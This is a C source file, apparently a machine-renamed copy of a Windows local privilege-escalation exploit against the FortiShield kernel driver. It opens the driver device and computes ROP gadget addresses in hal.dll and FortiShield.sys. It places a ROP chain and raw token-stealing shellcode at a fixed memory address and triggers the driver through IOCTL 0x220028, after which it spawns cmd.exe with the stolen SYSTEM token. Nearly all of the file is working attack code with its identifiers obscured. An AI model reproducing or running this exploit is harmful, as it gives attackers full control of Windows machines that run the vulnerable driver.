
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int token_steal ;
typedef char ULONGLONG ;
typedef int SIZE_T ;
typedef int * LPVOID ;
typedef int LPTHREAD_START_ROUTINE ;
typedef int LPDWORD ;
typedef int LPCSTR ;
typedef scalar_t__ HANDLE ;
typedef int DWORD ;
typedef scalar_t__ BOOL ;


 scalar_t__ FUNC_0 (int ,int,int ,int *,int ,int ,int *) ;
 scalar_t__ FUNC_1 (int *,int ,int ,int *,int ,int ) ;
 scalar_t__ FUNC_2 (scalar_t__,int,int *,int,int *,int,int*,int *) ;
 int VAR_0 ;
 int VAR_1 ;
 int * FUNC_3 (char*) ;
 scalar_t__ FUNC_4 () ;
 int FUNC_5 () ;
 int VAR_2 ;
 scalar_t__ VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 scalar_t__ FUNC_6 (scalar_t__,int ) ;
 int VAR_8 ;
 int * FUNC_7 (int **,int,int,int ) ;
 int FUNC_8 (scalar_t__,int ) ;
 scalar_t__ FUNC_9 (scalar_t__,int *,char*,int,int *) ;
 char FUNC_10 (int) ;
 scalar_t__ FUNC_11 (int) ;
 int FUNC_12 (char*,char*,int) ;
 int FUNC_13 (char*,int,int) ;
 int FUNC_14 (char*,int) ;
 int FUNC_15 (char*) ;
 int VAR_9 ;

int FUNC_16() {

 HANDLE VAR_10;
 VAR_10 = FUNC_0((LPCSTR)"\\\\.\\FortiShield", VAR_0 | VAR_1, 0, ((void*)0), VAR_6, 0, ((void*)0));
 if (VAR_10 == VAR_3) {
  FUNC_14("[!] Error while creating a handle to the driver: %d\n", FUNC_5());
  return 1;
 }

 LPVOID VAR_11 = FUNC_3("hal.dll");
 LPVOID VAR_12 = FUNC_3("FortiShield.sys");

 ULONGLONG VAR_13 = FUNC_10(0x0000000048000000);
 ULONGLONG VAR_14 = (ULONGLONG)VAR_11 + 0x6bf0;
 ULONGLONG VAR_15 = (ULONGLONG)VAR_12 + 0xd150;
 ULONGLONG VAR_16 = (ULONGLONG)VAR_12 + 0x2f73;

 FUNC_14("[+] HAL.dll found at: %llx\n", (ULONGLONG)VAR_11);
 FUNC_14("[+] FortiShield.sys found at: %llx\n", (ULONGLONG)VAR_12);
 FUNC_14("[+] PTE virtual address at: %llx\n", VAR_13);

 DWORD VAR_17 = 0x220028;
 ULONGLONG VAR_18 = VAR_14;
 DWORD VAR_19 = 0x8;
 ULONGLONG VAR_20 = 0x0;
 DWORD VAR_21 = 0x0;
 DWORD VAR_22;

 HANDLE VAR_23;
 VAR_23 = FUNC_4();
 ULONGLONG VAR_24 = 0x0000000047FF016F;
 LPVOID VAR_25;
 VAR_25 = FUNC_7((LPVOID*)VAR_24, 0x12000, VAR_4 | VAR_5, VAR_7);
 if (VAR_25 == ((void*)0)) {
  FUNC_14("[!] Error while allocating shellcode: %d\n", FUNC_5());
  return 1;
 }

 char *VAR_26;
 DWORD VAR_27 = 0x12000;
 ULONGLONG VAR_28 = (ULONGLONG)VAR_11 + 0x668e;
 ULONGLONG VAR_29 = 0x0000000000000063;
 ULONGLONG VAR_30 = (ULONGLONG)VAR_11 + 0x987e;
 ULONGLONG VAR_31 = VAR_13;
 ULONGLONG VAR_32 = (ULONGLONG)VAR_11 + 0xe2cc;
 ULONGLONG VAR_33 = (ULONGLONG)VAR_11 + 0x15a50;
 ULONGLONG VAR_34 = VAR_24 + 0x10040;
 ULONGLONG VAR_35 = VAR_15;
 ULONGLONG VAR_36 = VAR_16;
 char VAR_37[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x4C\x8B\x82\xB8"
                                          "\x00\x00\x00\x4D\x8B\x88\xF0\x02\x00\x00\x49\x8B\x09"
                                          "\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x08\x48\x8B\x09"
                                          "\x4C\x39\xC9\x75\xEE\x48\x8B\x41\x68\x24\xF0\x49\x89"
                                          "\x80\x58\x03\x00\x00\x48\x8B\xAC\x24\x80\x00\x00\x00"
                                          "\x48\x31\xDB\x48\x89\x5D\x00\x48\x8B\xAC\x24\x88\x00"
                                          "\x00\x00\x48\x89\xF0\x48\x89\xC4\x48\x83\xEC\x20\xFF\xE5";

 VAR_26 = (char *)FUNC_11(VAR_27);
 FUNC_13(VAR_26, 0x41, VAR_27);
 FUNC_12(VAR_26 + 0x10008, &VAR_28, 0x08);
 FUNC_12(VAR_26 + 0x10010, &VAR_29, 0x08);
 FUNC_12(VAR_26 + 0x10018, &VAR_30, 0x08);
 FUNC_12(VAR_26 + 0x10020, &VAR_31, 0x08);
 FUNC_12(VAR_26 + 0x10028, &VAR_32, 0x08);
 FUNC_12(VAR_26 + 0x10030, &VAR_33, 0x08);
 FUNC_12(VAR_26 + 0x10038, &VAR_34, 0x08);
 FUNC_12(VAR_26 + 0x10040, VAR_37, sizeof(VAR_37));
 FUNC_12(VAR_26 + 0x100C0, &VAR_35, 0x08);
 FUNC_12(VAR_26 + 0x100C8, &VAR_36, 0x08);

 BOOL VAR_38;
 SIZE_T VAR_39;
 VAR_38 = FUNC_9(VAR_23, (LPVOID)VAR_24, VAR_26, VAR_27, &VAR_39);
 if (VAR_38 == 0)
 {
  FUNC_14("[!] Error while calling WriteProcessMemory: %d\n", FUNC_5());
  return 1;
 }

 HANDLE VAR_40;
 LPDWORD VAR_41 = 0;
 VAR_40 = FUNC_1(((void*)0), 0, (LPTHREAD_START_ROUTINE)&VAR_9, ((void*)0), 0, VAR_41);
 if (VAR_40 == ((void*)0))
 {
  FUNC_14("[!] Error while calling CreateThread: %d\n", FUNC_5());
  return 1;
 }

 BOOL VAR_42;
 VAR_42 = FUNC_6(VAR_40, VAR_8);
 if (VAR_42 == 0)
 {
  FUNC_14("[!] Error while calling SetThreadPriority: %d\n", FUNC_5());
  return 1;
 }

 BOOL VAR_43;
 VAR_43 = FUNC_2(VAR_10, VAR_17, (LPVOID)&VAR_18, VAR_19, (LPVOID)&VAR_20, VAR_21, &VAR_22, ((void*)0));
 FUNC_8(VAR_40, VAR_2);

 FUNC_15("start cmd.exe");
 return 0;
}
